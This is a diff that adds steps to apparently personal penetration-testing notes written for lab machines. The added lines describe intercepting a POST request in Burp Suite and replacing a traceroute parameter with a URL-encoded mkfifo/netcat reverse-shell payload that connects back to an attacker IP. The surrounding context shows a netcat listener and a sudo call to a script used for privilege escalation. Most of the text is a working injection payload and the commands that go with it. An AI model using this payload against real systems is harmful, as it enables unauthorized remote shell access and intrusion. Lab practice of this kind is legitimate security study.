@@ -266,7 +266,9 @@ a. Network Exploitation
 				c. In kali, nc -nlvp 1234
 				d. back in the shell, run the command: sudo /home/nibbler/personal/stuff/monitor.sh
 
-			
+			iii.) From a burpsuite, if you do intercept & find like a post request: command=traceroute&host=8.8.8.8
+				you want to get a shell, open a nc -nlvp 1708 on your local host: IP: 10.10.14.59
+				change the command to send a shell to your IP: rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.59+1708+>/tmp/f
 			
 	iii)Post Exploitation / Persistence
 		a.) Golden Ticket
